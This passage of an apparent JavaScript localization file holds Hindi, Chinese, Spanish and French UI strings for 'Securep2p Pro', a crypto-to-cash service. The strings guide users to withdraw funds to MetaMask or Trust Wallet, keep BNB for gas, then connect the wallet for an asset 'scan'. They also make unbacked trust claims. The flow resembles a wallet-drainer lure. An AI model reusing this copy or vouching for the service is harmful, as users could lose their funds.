            step3Address: 'अपना वॉलेट पता दर्ज करें: Trust Wallet या MetaMask खोलें। "Smart Chain" (BSC के लिए) चुनें या यदि पहले से नहीं है तो MetaMask में BSC जोड़ें। अपना BEP20 पता कॉपी करें (यह 0x... से शुरू होगा)। एक्सचेंज निकासी फॉर्म में पता पेस्ट करें। निकासी राशि दर्ज करें (निकासी फीस के लिए थोड़ी राशि छोड़ें, एक्सचेंज पर दिखाई गई)। कोई भी 2FA/सुरक्षा जांच पूरी करें। निकासी की पुष्टि करें।',
            step4Title: "4. BNB निकालें (गैस फीस के लिए)",
            step4Content: "BNB के साथ निकासी प्रक्रिया दोहराएं: BNB को उसी पते पर निकालें (आपका MetaMask/Trust Wallet)। आपको केवल थोड़ी मात्रा की आवश्यकता है (जैसे 0.002 BNB)।",
            step5Title: "5. पुष्टि की प्रतीक्षा करें",
            step5Content: 'अधिकांश BEP20 निकासी 2-10 मिनट के भीतर प्रोसेस हो जाती है। "Smart Chain"/BSC नेटवर्क के तहत USDT और BNB बैलेंस के लिए अपना Trust Wallet/MetaMask जांचें।',
            step6Title: "6. (यदि आपके वॉलेट में केवल USDT है और BNB नहीं है)",
            step6Content: "भविष्य के लेनदेन (भेजना, स्वैप करना, आदि) के लिए भुगतान करने के लिए आपके वॉलेट में कुछ BNB होना चाहिए। यदि आप भूल गए, तो आप कर सकते हैं: एक्सचेंज पर BNB खरीदें और अपने वॉलेट में भेजें। किसी मित्र से थोड़ी मात्रा में BNB भेजने को कहें। 0 BNB के साथ BEP20 टोकन को स्थानांतरित/स्वैप करने की कोशिश कभी न करें – लेनदेन विफल हो जाएगा।",
            sampleFlowTitle: "नमूना प्रवाह – Binance से MetaMask (BEP20 USDT)",
            sampleStep1: "अपने अन्य टोकन को USDT के लिए बेचें।",
            sampleStep2: "$1 मूल्य का BNB खरीदें।",
            sampleStep3: "अपने MetaMask BSC पते पर USDT (BEP20) निकालें।",
            sampleStep4: "उसी पते पर BNB (BEP20) निकालें।",
            sampleStep5: "दोनों के आने की प्रतीक्षा करें।",
            proTipsTitle: "प्रो टिप्स",
            proTip1: 'हमेशा नेटवर्क की दोबारा जांच करें: BEP20 के लिए, नेटवर्क "Binance Smart Chain" है (ERC20, TRC20 नहीं)।',
            proTip2: "निकासी प्रक्रिया की पुष्टि के लिए पहले छोटी राशि (जैसे $5) के साथ परीक्षण करें।",
            proTip3: "कभी भी गलत नेटवर्क पर फंड न भेजें—यदि आप असमर्थित नेटवर्क पतों पर भेजते हैं तो संपत्ति खो सकती है।",
            proTip4: "यदि आप फंस जाते हैं, तो वास्तविक समय की स्थिति के लिए अपने एक्सचेंज निकासी इतिहास और अपने वॉलेट की BSCscan.com प्रविष्टि (पते द्वारा खोजें) की जांच करें।"
        }
    },
    zh: {
        translation: {
            "header.title": "安全交换专业版",
            "header.liveRates": "实时汇率",
            "header.connected": "已连接",
            "header.livePayout": "实时支付",
            "header.successful": "成功",
            "header.trading": "交易",
            "header.pricing": "定价",
            "header.settlement": "结算",
            "trust.totalVolume": "总交易量",
            "trust.activeUsers": "活跃用户",
            "trust.successRate": "成功率",
            "trust.avgSettlement": "平均结算",
            "asset.title": "资产管理",
            "asset.subtitle": "立即将您的加密资产转换为现金",
            "asset.connectWallet": "连接您的钱包",
            "asset.connectSubtitle": "安全连接到BSC网络",
            "asset.connectButton": "连接钱包",
            "asset.connecting": "连接中...",
            "asset.tradeAssets": "交易您的资产",
            "asset.tradeSubtitle": "选择要转换为现金的资产",
            "asset.scanningAssets": "扫描您的资产",
            "asset.analyzing": "正在分析您的钱包以查找可用代币...",
            "asset.selectAsset": "选择要交易的资产",
            "asset.chooseAsset": "从您的钱包中选择一个资产",
            "asset.amountToTrade": "交易金额",
            "asset.maxBalance": "最大余额",
            "asset.amountExceeds": "金额超过可用余额",
            "asset.liveCalculation": "实时价格计算",
            "asset.marketRate": "基于当前市场汇率",
            "asset.enterAmount": "输入金额以查看实时计算",
            "asset.fetchingPrice": "获取实时价格...",
            "asset.youReceive": "您将收到",
            "asset.usdEquivalent": "美元等值",
            "asset.priceBreakdown": "价格明细",
            "asset.marketPrice": "市场价格",
            "asset.exchangeMarkup": "交易所加价 (15%)",
            "asset.totalReceive": "您总共收到",
            "asset.nextPayout": "下一步：选择支付方式",
            "asset.noAssets": "未找到资产",
            "asset.noAssetsDesc": "在您的钱包中未找到可交易资产",
            "asset.tip": "提示：确保您的BSC钱包中有代币",
            "exchange.transferGuide": "从币安/库币转账到MetaMask/TrustWallet",
            "exchange.howToTransfer": "如何从交易所转账到钱包",
            "exchange.fromBinance": "从币安交易所",
            "exchange.fromKucoin": "从库币交易所",
            "exchange.settingUpWallet": "设置您的钱包",
            "exchange.metamaskSetup": "MetaMask设置",
            "exchange.trustwalletSetup": "TrustWallet设置",
            "exchange.importantTips": "重要提示",
            "exchange.step1": "登录并导航到钱包",
            "exchange.step1Desc": `• 登录您的币安账户
• 转到"钱包"→"现货钱包"
• 找到您的加密货币（BTC、ETH、USDT等）`,
            "exchange.step2": "发起提现",
            "exchange.step2Desc": `• 点击您的加密货币旁边的"提现"
• 选择"通过加密网络发送"
• 选择"BSC (BEP20)"网络以降低费用`,
            "exchange.step3": "输入钱包地址",
            "exchange.step3Desc": `• 复制您的MetaMask/TrustWallet BSC地址
• 将其粘贴到"收款人地址"字段中
• 仔细检查地址是否正确`,
            "exchange.step4": "完成转账",
            "exchange.step4Desc": `• 输入提现金额
• 查看网络费用（BSC上通常为$1-3）
• 点击"提现"并通过邮件/短信确认`,
            "exchange.kucoin1": "访问资产",
            "exchange.kucoin1Desc": `• 登录库币账户
• 转到"资产"→"主账户"
• 找到您的加密货币`,
            "exchange.kucoin2": "开始提现",
            "exchange.kucoin2Desc": `• 点击"提现"按钮
• 选择"链上提现"
• 选择"BSC"网络以获得最佳费率`,
            "exchange.kucoin3": "添加钱包地址",
            "exchange.kucoin3Desc": `• 获取您钱包的BSC地址
• 粘贴到"提现地址"字段中
• 如需要，将地址添加到白名单`,
            "exchange.kucoin4": "确认提现",
            "exchange.kucoin4Desc": `• 输入提现金额
• 查看费用和最终金额
• 通过2FA/邮件验证确认`,
            "exchange.metamaskDesc": `• 安装MetaMask浏览器扩展
• 创建新钱包或导入现有钱包
• 手动添加BSC网络：
网络：BSC主网
RPC：https://bsc-dataseed.binance.org/
链ID：56
符号：BNB`,
            "exchange.trustwalletDesc": `• 下载TrustWallet手机应用
• 创建新钱包或导入
• BSC网络已预配置
• 在设置中启用智能链（BNB）
• 您的BSC地址以"0x..."开头`,
            "exchange.tip1": "• 始终使用BSC (BEP20)网络以获得最低费用（$1-3 vs 以太坊上的$20-50）",
            "exchange.tip2": "• 仔细检查钱包地址 - 加密货币转账不可逆转",
            "exchange.tip3": "• 先用小额测试流程",
            "exchange.tip4": "• 在钱包中保留一些BNB用于交易费用",
            "exchange.tip5": "• 转账通常在BSC网络上需要1-5分钟",
            "howWorks.title": "工作原理",
            "howWorks.choosePayment": "选择支付方式",
            "howWorks.choosePaymentDesc": "选择您首选的支付方式和地区",
            "howWorks.placeOrder": "下订单",
            "howWorks.placeOrderDesc": "指定金额并确认交易详情",
            "howWorks.processPayment": "处理支付",
            "howWorks.processPaymentDesc": "我们的系统安全地处理您的加密资产",
            "howWorks.settlement": "即时结算",
            "howWorks.settlementDesc": "在几分钟内通过您选择的支付方式收到资金",
            "howWorks.complete": "交易完成",
            "howWorks.completeDesc": "您的加密货币已成功转换为现金",
            "howWorks.note": "注意：所有交易都通过多重签名技术保护",
            "howWorks.support": "24/7客户支持可提供帮助",
            "payment.selected": "已选择",
            "common.loading": "加载中...",
            "common.error": "错误",
            "common.success": "成功",
            "common.continue": "继续",
            "common.back": "返回",
            "common.next": "下一步",
            "common.confirm": "确认",
            "common.cancel": "取消"
        },
        detailedGuide: {
            step1Title: "1. 将您的代币转换为USDT",
            step1Subtitle: "（适用于所有交易所 – Binance、KuCoin、OKX、Bitget、Kraken等）",
            step1Content: '登录您的交易所账户（Binance、KuCoin等）。转到"交易"或"兑换"部分。选择您持有的代币（例如BTC、ETH）。选择交换/出售为USDT（Tether）。确认交易。现在您的余额是USDT。',
            step1Binance: '在Binance上："兑换" > 选择代币 > USDT > 兑换。',
            step1Kucoin: '在KuCoin上："交易" > 现货 > 选择交易对（例如BTC/USDT）> 出售为USDT。',
            step1Others: "在OKX/Bitget/Kraken上：根据UI使用现货/兑换/交易。",
            step2Title: "2. 准备提现 – 支付BEP20费用",
            step2Content: "BEP20（币安智能链）提现需要您钱包中有少量BNB来支付gas费用。一些交易所会自动从您的提现中扣除BNB，但许多只发送USDT——您需要手动发送一点BNB用于未来交易。",
            step2Action: '要做什么：购买约$1价值的BNB（0.002 BNB通常足够进行多次转账）。与上述相同：转到"交易' / '兑换"，用USDT购买BNB。',
            step3Title: "3. 将USDT（BEP20）提现到Trust Wallet/MetaMask",
            step3Content: '在您的交易所转到"钱包"或"资产"。找到USDT，点击"提现"或"发送"。',
            step3Network: '网络选择：选择"BEP20（BSC）"/"币安智能链（BEP20）"作为提现网络。',
            step3Warning: "⚠️ 如果您想使用BSC/BEP20，请不要选择ERC20或TRC20。",
            step3Address: '输入您的钱包地址：打开Trust Wallet或MetaMask。选择"智能链"（用于BSC）或如果尚未添加，请将BSC添加到MetaMask。复制您的BEP20地址（将以0x...开头）。将地址粘贴到交易所提现表单中。输入提现金额（为提现费用留出少量，交易所会显示）。完成任何2FA/安全检查。确认提现。',
            step4Title: "4. 提现BNB（用于gas费用）",
            step4Content: "对BNB重复提现过程：将BNB提现到同一地址（您的MetaMask/Trust Wallet）。您只需要少量（例如0.002 BNB）。",
            step5Title: "5. 等待确认",
            step5Content: '大多数BEP20提现在2-10分钟内处理完成。在"智能链"/BSC网络下检查您的Trust Wallet/MetaMask的USDT和BNB余额。',
            step6Title: "6. （如果您的钱包中只有USDT而没有BNB）",
            step6Content: "您必须在钱包中有一些BNB来支付未来的交易（发送、交换等）。如果您忘记了，您可以：在交易所购买BNB并发送到您的钱包。请朋友发送少量BNB给您。永远不要尝试在钱包中BNB为0的情况下移动/交换BEP20代币——交易将失败。",
            sampleFlowTitle: "示例流程 – Binance到MetaMask（BEP20 USDT）",
            sampleStep1: "将您的其他代币出售为USDT。",
            sampleStep2: "购买$1价值的BNB。",
            sampleStep3: "将USDT（BEP20）提现到您的MetaMask BSC地址。",
            sampleStep4: "将BNB（BEP20）提现到同一地址。",
            sampleStep5: "等待两者到达。",
            proTipsTitle: "专业提示",
            proTip1: '始终仔细检查网络：对于BEP20，网络是"币安智能链"（不是ERC20，不是TRC20）。',
            proTip2: "首先用少量（例如$5）测试以确认提现过程。",
            proTip3: "永远不要将资金发送到错误的网络——如果您发送到不支持的网络地址，资产可能会丢失。",
            proTip4: "如果遇到困难，请检查您的交易所提现历史记录和钱包的BSCscan.com条目（按地址搜索）以获取实时状态。"
        }
    },
    es: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Tasas en Vivo",
            "header.connected": "Conectado",
            "header.livePayout": "PAGO EN VIVO",
            "header.successful": "Exitoso",
            "header.trading": "Comercio",
            "header.pricing": "Precios",
            "header.settlement": "Liquidación",
            "trust.totalVolume": "Volumen Total",
            "trust.activeUsers": "Usuarios Activos",
            "trust.successRate": "Tasa de Éxito",
            "trust.avgSettlement": "Liquidación Promedio",
            "asset.title": "Gestión de Activos",
            "asset.subtitle": "Convierte tus activos cripto a efectivo al instante",
            "asset.connectWallet": "Conecta tu Billetera",
            "asset.connectSubtitle": "Conexión segura a la red BSC",
            "asset.connectButton": "Conectar Billetera",
            "asset.connecting": "Conectando...",
            "asset.tradeAssets": "Comercia tus Activos",
            "asset.tradeSubtitle": "Selecciona activos para convertir a efectivo",
            "asset.scanningAssets": "Escaneando tus Activos",
            "asset.analyzing": "Analizando tu billetera para tokens disponibles...",
            "asset.selectAsset": "Selecciona Activo para Comerciar",
            "asset.chooseAsset": "Elige un activo de tu billetera",
            "asset.amountToTrade": "Cantidad a Comerciar",
            "asset.maxBalance": "Balance Máximo",
            "asset.amountExceeds": "La cantidad excede el balance disponible",
            "asset.liveCalculation": "Cálculo de Precio en Vivo",
            "asset.marketRate": "Basado en tasas de mercado actuales",
            "asset.enterAmount": "Ingresa cantidad para ver cálculo en vivo",
            "asset.fetchingPrice": "Obteniendo precio en vivo...",
            "asset.youReceive": "Recibirás",
            "asset.usdEquivalent": "Equivalente en USD",
            "asset.priceBreakdown": "Desglose de Precio",
            "asset.marketPrice": "Precio de Mercado",
            "asset.exchangeMarkup": "Margen de Intercambio (15%)",
            "asset.totalReceive": "Total que Recibirás",
            "asset.nextPayout": "Siguiente: Elegir Método de Pago",
            "asset.noAssets": "No se Encontraron Activos",
            "asset.noAssetsDesc": "No se encontraron activos comerciables en tu billetera",
            "asset.tip": "Consejo: Asegúrate de tener tokens en tu billetera BSC",
            "exchange.transferGuide": "Transferir de Binance/KuCoin a MetaMask/TrustWallet",
            "exchange.howToTransfer": "Cómo Transferir del Exchange a la Billetera",
            "exchange.fromBinance": "Desde Binance Exchange",
            "exchange.fromKucoin": "Desde KuCoin Exchange",
            "exchange.settingUpWallet": "Configurando tu Billetera",
            "exchange.metamaskSetup": "Configuración de MetaMask",
            "exchange.trustwalletSetup": "Configuración de TrustWallet",
            "exchange.importantTips": "Consejos Importantes",
            "exchange.step1": "Iniciar Sesión y Navegar a la Billetera",
            "exchange.step1Desc": `• Inicia sesión en tu cuenta de Binance
• Ve a "Billetera" → "Fiat y Spot"
• Encuentra tu cripto (BTC, ETH, USDT, etc.)`,
            "exchange.step2": "Iniciar Retiro",
            "exchange.step2Desc": `• Haz clic en "Retirar" junto a tu cripto
• Selecciona "Enviar vía Red Cripto"
• Elige la red "BSC (BEP20)" para menores comisiones`,
            "exchange.step3": "Ingresar Dirección de Billetera",
            "exchange.step3Desc": `• Copia tu dirección BSC de MetaMask/TrustWallet
• Pégala en el campo "Dirección del Destinatario"
• Verifica que la dirección sea correcta`,
            "exchange.step4": "Completar Transferencia",
            "exchange.step4Desc": `• Ingresa la cantidad a retirar
• Revisa la comisión de red (usualmente $1-3 en BSC)
• Haz clic en "Retirar" y confirma vía email/SMS`,
            "exchange.kucoin1": "Acceder a Activos",
            "exchange.kucoin1Desc": `• Inicia sesión en la cuenta de KuCoin
• Ve a "Activos" → "Cuenta Principal"
• Localiza tu criptomoneda`,
            "exchange.kucoin2": "Iniciar Retiro",
            "exchange.kucoin2Desc": `• Haz clic en el botón "Retirar"
• Selecciona "Retiro On-chain"
• Elige la red "BSC" para mejores tarifas`,
            "exchange.kucoin3": "Agregar Dirección de Billetera",
            "exchange.kucoin3Desc": `• Obtén la dirección BSC de tu billetera
• Pégala en el campo "Dirección de Retiro"
• Agrega la dirección a la lista blanca si es necesario`,
            "exchange.kucoin4": "Confirmar Retiro",
            "exchange.kucoin4Desc": `• Ingresa la cantidad de retiro
• Revisa las comisiones y cantidad final
• Confirma con verificación 2FA/email`,
            "exchange.metamaskDesc": `• Instala la extensión de navegador MetaMask
• Crea nueva billetera o importa existente
• Agrega la red BSC manualmente:
Red: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
ID de Cadena: 56
Símbolo: BNB`,
            "exchange.trustwalletDesc": `• Descarga la app móvil TrustWallet
• Crea nueva billetera o importa
• La red BSC está preconfigurada
• Habilita Smart Chain (BNB) en configuración
• Tu dirección BSC comienza con "0x..."`,
            "exchange.tip1": "• Siempre usa la red BSC (BEP20) para las comisiones más bajas ($1-3 vs $20-50 en Ethereum)",
            "exchange.tip2": "• Verifica las direcciones de billetera - las transferencias cripto son irreversibles",
            "exchange.tip3": "• Comienza con cantidades pequeñas para probar el proceso primero",
            "exchange.tip4": "• Mantén algo de BNB en tu billetera para comisiones de transacción",
            "exchange.tip5": "• Las transferencias usualmente toman 1-5 minutos en la red BSC",
            "howWorks.title": "Cómo Funciona",
            "howWorks.choosePayment": "Elige Método de Pago",
            "howWorks.choosePaymentDesc": "Selecciona tu método de pago y región preferidos",
            "howWorks.placeOrder": "Realiza tu Pedido",
            "howWorks.placeOrderDesc": "Especifica la cantidad y confirma los detalles de la transacción",
            "howWorks.processPayment": "Procesar Pago",
            "howWorks.processPaymentDesc": "Nuestro sistema procesa tus activos cripto de forma segura",
            "howWorks.settlement": "Liquidación Instantánea",
            "howWorks.settlementDesc": "Recibe fondos en tu método de pago elegido en minutos",
            "howWorks.complete": "Transacción Completa",
            "howWorks.completeDesc": "Tu cripto ha sido convertido exitosamente a efectivo",
            "howWorks.note": "Nota: Todas las transacciones están aseguradas con tecnología multi-firma",
            "howWorks.support": "Soporte al cliente 24/7 disponible para asistencia",
            "payment.selected": "Seleccionado",
            "common.loading": "Cargando...",
            "common.error": "Error",
            "common.success": "Éxito",
            "common.continue": "Continuar",
            "common.back": "Atrás",
            "common.next": "Siguiente",
            "common.confirm": "Confirmar",
            "common.cancel": "Cancelar"
        },
        detailedGuide: {
            step1Title: "1. Convierte tu Token a USDT",
            step1Subtitle: "(Funciona en todos los exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            step1Content: 'Inicia sesión en tu cuenta del exchange (Binance, KuCoin, etc.). Ve a la sección "Trade" o "Convert". Selecciona el token que tienes (ej. BTC, ETH). Elige intercambiar/vender por USDT (Tether). Confirma el intercambio. Ahora tu saldo está en USDT.',
            step1Binance: 'En Binance: "Convert" > seleccionar token > USDT > Convert.',
            step1Kucoin: 'En KuCoin: "Trade" > Spot > seleccionar par (ej. BTC/USDT) > Vender por USDT.',
            step1Others: "En OKX/Bitget/Kraken: Usar Spot/Convert/Trade según la UI.",
            step2Title: "2. Prepárate para el Retiro – Cubrir Tarifas BEP20",
            step2Content: "Los retiros BEP20 (Binance Smart Chain) requieren una pequeña cantidad de BNB en tu wallet para pagar las tarifas de gas. Algunos exchanges deducen BNB automáticamente de tu retiro, pero muchos solo envían USDT—necesitarás enviar manualmente un poco de BNB para futuras transacciones.",
            step2Action: 'Qué hacer: Compra ~$1 de BNB (0.002 BNB es usualmente suficiente para muchas transferencias). Igual que arriba: Ve a "Trade"/"Convert", compra BNB con USDT.',
            step3Title: "3. Retirar USDT (BEP20) a Trust Wallet/MetaMask",
            step3Content: 'Ve a "Wallet" o "Assets" en tu exchange. Encuentra USDT, haz clic en "Withdraw" o "Send".',
            step3Network: 'Selección de Red: Elige "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" como la red de retiro.',
            step3Warning: "⚠️ No selecciones ERC20 o TRC20 si quieres usar BSC/BEP20.",
            step3Address: 'Ingresa tu Dirección de Wallet: Abre Trust Wallet o MetaMask. Selecciona "Smart Chain" (para BSC) o agrega BSC a MetaMask si no está ya. Copia tu dirección BEP20 (comenzará con 0x...). Pega la dirección en el formulario de retiro del exchange. Ingresa la cantidad de retiro (deja una pequeña cantidad para tarifas de retiro, mostradas en el exchange). Completa cualquier verificación 2FA/Seguridad. Confirma el retiro.',
            step4Title: "4. Retirar BNB (para Tarifas de Gas)",
            step4Content: "Repite el proceso de retiro con BNB: Retira BNB a la misma dirección (tu MetaMask/Trust Wallet). Solo necesitas una pequeña cantidad (ej. 0.002 BNB).",
            step5Title: "5. Esperar Confirmación",
            step5Content: 'La mayoría de retiros BEP20 se procesan en 2-10 minutos. Verifica tu Trust Wallet/MetaMask para saldos de USDT y BNB bajo la red "Smart Chain"/BSC.',
            step6Title: "6. (Si Solo Tienes USDT y No BNB en tu Wallet)",
            step6Content: "DEBES tener algo de BNB en tu wallet para pagar futuras transacciones (enviar, intercambiar, etc). Si olvidaste, puedes: Comprar BNB en el exchange y enviarlo a tu wallet. Pedir a un amigo que te envíe una pequeña cantidad de BNB. Nunca trates de mover/intercambiar tokens BEP20 con 0 BNB en tu wallet – la transacción fallará.",
            sampleFlowTitle: "Flujo de Ejemplo – Binance a MetaMask (BEP20 USDT)",
            sampleStep1: "Vende tu otro token por USDT.",
            sampleStep2: "Compra $1 de BNB.",
            sampleStep3: "Retira USDT (BEP20) a tu dirección BSC de MetaMask.",
            sampleStep4: "Retira BNB (BEP20) a la misma dirección.",
            sampleStep5: "Espera a que lleguen ambos.",
            proTipsTitle: "Consejos Pro",
            proTip1: 'Siempre verifica dos veces la red: Para BEP20, la red es "Binance Smart Chain" (no ERC20, no TRC20).',
            proTip2: "Prueba primero con una cantidad pequeña (ej. $5) para confirmar el proceso de retiro.",
            proTip3: "Nunca envíes fondos a la red incorrecta—los activos pueden perderse si envías a direcciones de red no soportadas.",
            proTip4: "Si te quedas atascado, verifica tu historial de retiros del exchange y la entrada BSCscan.com de tu wallet (buscar por dirección) para el estado en tiempo real."
        }
    },
    fr: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Taux en Direct",
            "header.connected": "Connecté",
            "header.livePayout": "PAIEMENT EN DIRECT",
            "header.successful": "Réussi",
            "header.trading": "Trading",
            "header.pricing": "Tarification",
            "header.settlement": "Règlement",
            "trust.totalVolume": "Volume Total",
            "trust.activeUsers": "Utilisateurs Actifs",
            "trust.successRate": "Taux de Réussite",
            "trust.avgSettlement": "Règlement Moyen",
            "asset.title": "Gestion d'Actifs",
            "asset.subtitle": "Convertissez vos actifs crypto en espèces instantanément",
            "asset.connectWallet": "Connectez votre Portefeuille",
            "asset.connectSubtitle": "Connexion sécurisée au réseau BSC",
            "asset.connectButton": "Connecter le Portefeuille",
            "asset.connecting": "Connexion...",
            "asset.tradeAssets": "Échangez vos Actifs",
            "asset.tradeSubtitle": "Sélectionnez les actifs à convertir en espèces",
            "asset.scanningAssets": "Analyse de vos Actifs",
            "asset.analyzing": "Analyse de votre portefeuille pour les tokens disponibles...",
            "asset.selectAsset": "Sélectionnez l'Actif à Échanger",
            "asset.chooseAsset": "Choisissez un actif de votre portefeuille",
            "asset.amountToTrade": "Montant à Échanger",
            "asset.maxBalance": "Solde Maximum",
            "asset.amountExceeds": "Le montant dépasse le solde disponible",
            "asset.liveCalculation": "Calcul de Prix en Direct",
            "asset.marketRate": "Basé sur les taux de marché actuels",
            "asset.enterAmount": "Entrez le montant pour voir le calcul en direct",
            "asset.fetchingPrice": "Récupération du prix en direct...",
            "asset.youReceive": "Vous Recevrez",
            "asset.usdEquivalent": "Équivalent USD",
            "asset.priceBreakdown": "Détail du Prix",
            "asset.marketPrice": "Prix du Marché",
            "asset.exchangeMarkup": "Marge d'Échange (15%)",
            "asset.totalReceive": "Total que Vous Recevrez",
            "asset.nextPayout": "Suivant: Choisir la Méthode de Paiement",
            "asset.noAssets": "Aucun Actif Trouvé",
            "asset.noAssetsDesc": "Aucun actif échangeable trouvé dans votre portefeuille",
            "asset.tip": "Conseil: Assurez-vous d'avoir des tokens dans votre portefeuille BSC",
            "exchange.transferGuide": "Transférer de Binance/KuCoin vers MetaMask/TrustWallet",
            "exchange.howToTransfer": "Comment Transférer de l'Exchange vers le Portefeuille",
            "exchange.fromBinance": "Depuis Binance Exchange",
            "exchange.fromKucoin": "Depuis KuCoin Exchange",
            "exchange.settingUpWallet": "Configuration de votre Portefeuille",
            "exchange.metamaskSetup": "Configuration MetaMask",
            "exchange.trustwalletSetup": "Configuration TrustWallet",
            "exchange.importantTips": "Conseils Importants",
            "exchange.step1": "Connexion et Navigation vers le Portefeuille",
            "exchange.step1Desc": `• Connectez-vous à votre compte Binance
• Allez dans "Portefeuille" → "Fiat et Spot"
• Trouvez votre crypto (BTC, ETH, USDT, etc.)`,
            "exchange.step2": "Initier le Retrait",
            "exchange.step2Desc": `• Cliquez sur "Retirer" à côté de votre crypto
• Sélectionnez "Envoyer via Réseau Crypto"
• Choisissez le réseau "BSC (BEP20)" pour des frais plus bas`,
            "exchange.step3": "Entrer l'Adresse du Portefeuille",
            "exchange.step3Desc": `• Copiez votre adresse BSC MetaMask/TrustWallet
• Collez-la dans le champ "Adresse du Destinataire"
• Vérifiez que l'adresse est correcte`,
            "exchange.step4": "Compléter le Transfert",
            "exchange.step4Desc": `• Entrez le montant à retirer
• Vérifiez les frais de réseau (généralement $1-3 sur BSC)
• Cliquez sur "Retirer" et confirmez via email/SMS`,
            "exchange.kucoin1": "Accéder aux Actifs",
            "exchange.kucoin1Desc": `• Connectez-vous au compte KuCoin
• Allez dans "Actifs" → "Compte Principal"
• Localisez votre cryptomonnaie`,
            "exchange.kucoin2": "Commencer le Retrait",
            "exchange.kucoin2Desc": `• Cliquez sur le bouton "Retirer"
• Sélectionnez "Retrait On-chain"
• Choisissez le réseau "BSC" pour les meilleurs taux`,
            "exchange.kucoin3": "Ajouter l'Adresse du Portefeuille",
            "exchange.kucoin3Desc": `• Obtenez l'adresse BSC de votre portefeuille
• Collez dans le champ "Adresse de Retrait"
• Ajoutez l'adresse à la liste blanche si nécessaire`,
            "exchange.kucoin4": "Confirmer le Retrait",
            "exchange.kucoin4Desc": `• Entrez le montant de retrait
• Vérifiez les frais et le montant final
• Confirmez avec la vérification 2FA/email`,
            "exchange.metamaskDesc": `• Installez l'extension navigateur MetaMask
• Créez un nouveau portefeuille ou importez existant
• Ajoutez le réseau BSC manuellement:
Réseau: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
ID de Chaîne: 56
Symbole: BNB`,
            "exchange.trustwalletDesc": `• Téléchargez l'app mobile TrustWallet
• Créez un nouveau portefeuille ou importez
• Le réseau BSC est pré-configuré
• Activez Smart Chain (BNB) dans les paramètres
• Votre adresse BSC commence par "0x..."`,
            "exchange.tip1": "• Utilisez toujours le réseau BSC (BEP20) pour les frais les plus bas ($1-3 vs $20-50 sur Ethereum)",
            "exchange.tip2": "• Vérifiez les adresses de portefeuille - les transferts crypto sont irréversibles",
            "exchange.tip3": "• Commencez avec de petits montants pour tester le processus d'abord",
            "exchange.tip4": "• Gardez du BNB dans votre portefeuille pour les frais de transaction",
            "exchange.tip5": "• Les transferts prennent généralement 1-5 minutes sur le réseau BSC",
            "howWorks.title": "Comment ça Marche",
            "howWorks.choosePayment": "Choisir la Méthode de Paiement",
            "howWorks.choosePaymentDesc": "Sélectionnez votre méthode de paiement et région préférées",
            "howWorks.placeOrder": "Passez votre Commande",
            "howWorks.placeOrderDesc": "Spécifiez le montant et confirmez les détails de la transaction",
            "howWorks.processPayment": "Traiter le Paiement",
            "howWorks.processPaymentDesc": "Notre système traite vos actifs crypto en toute sécurité",
            "howWorks.settlement": "Règlement Instantané",
            "howWorks.settlementDesc": "Recevez des fonds via votre méthode de paiement choisie en minutes",
            "howWorks.complete": "Transaction Terminée",
            "howWorks.completeDesc": "Votre crypto a été converti avec succès en espèces",
            "howWorks.note": "Note: Toutes les transactions sont sécurisées avec la technologie multi-signature",
            "howWorks.support": "Support client 24/7 disponible pour assistance",
            "payment.selected": "Sélectionné",
            "common.loading": "Chargement...",
            "common.error": "Erreur",
            "common.success": "Succès",
            "common.continue": "Continuer",
            "common.back": "Retour",
            "common.next": "Suivant",
            "common.confirm": "Confirmer",
            "common.cancel": "Annuler"
        },
        detailedGuide: {
            step1Title: "1. Convertissez votre Token en USDT",
            step1Subtitle: "(Fonctionne sur tous les exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            step1Content: `Connectez-vous à votre compte d'exchange (Binance, KuCoin, etc.). Allez dans la section "Trade" ou "Convert". Sélectionnez le token que vous possédez (ex. BTC, ETH). Choisissez d'échanger/vendre pour USDT (Tether). Confirmez l'échange. Maintenant votre solde est en USDT.`,
            step1Binance: 'Sur Binance: "Convert" > sélectionner token > USDT > Convert.',
            step1Kucoin: 'Sur KuCoin: "Trade" > Spot > sélectionner paire (ex. BTC/USDT) > Vendre pour USDT.',
            step1Others: "Sur OKX/Bitget/Kraken: Utiliser Spot/Convert/Trade selon l'UI.",
            step2Title: "2. Préparez-vous pour le Retrait – Couvrir les Frais BEP20",
            step2Content: "Les retraits BEP20 (Binance Smart Chain) nécessitent une petite quantité de BNB dans votre portefeuille pour payer les frais de gas. Certains exchanges déduisent automatiquement BNB de votre retrait, mais beaucoup n'envoient que USDT—vous devrez envoyer manuellement un peu de BNB pour les futures transactions.",
            step2Action: 'Que faire: Achetez ~$1 de BNB (0.002 BNB est généralement suffisant pour de nombreux transferts). Comme ci-dessus: Allez dans "Trade"/"Convert", achetez BNB avec USDT.',
            step3Title: "3. Retirer USDT (BEP20) vers Trust Wallet/MetaMask",
            step3Content: 'Allez dans "Wallet" ou "Assets" sur votre exchange. Trouvez USDT, cliquez sur "Withdraw" ou "Send".',
            step3Network: 'Sélection de Réseau: Choisissez "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" comme réseau de retrait.',
            step3Warning: "⚠️ Ne sélectionnez pas ERC20 ou TRC20 si vous voulez utiliser BSC/BEP20.",
            step3Address: `Entrez votre Adresse de Portefeuille: Ouvrez Trust Wallet ou MetaMask. Sélectionnez "Smart Chain" (pour BSC) ou ajoutez BSC à MetaMask si pas déjà fait. Copiez votre adresse BEP20 (elle commencera par 0x...). Collez l'adresse dans le formulaire de retrait de l'exchange. Entrez le montant de retrait (laissez un petit montant pour les frais de retrait, affichés sur l'exchange). Complétez toute vérification 2FA/Sécurité. Confirmez le retrait.`,
            step4Title: "4. Retirer BNB (pour les Frais de Gas)",
            step4Content: "Répétez le processus de retrait avec BNB: Retirez BNB vers la même adresse (votre MetaMask/Trust Wallet). Vous n'avez besoin que d'une petite quantité (ex. 0.002 BNB).",
            step5Title: "5. Attendre la Confirmation",
            step5Content: 'La plupart des retraits BEP20 sont traités en 2-10 minutes. Vérifiez votre Trust Wallet/MetaMask pour les soldes USDT et BNB sous le réseau "Smart Chain"/BSC.',
            step6Title: "6. (Si vous n'avez que USDT et pas de BNB dans votre Portefeuille)",
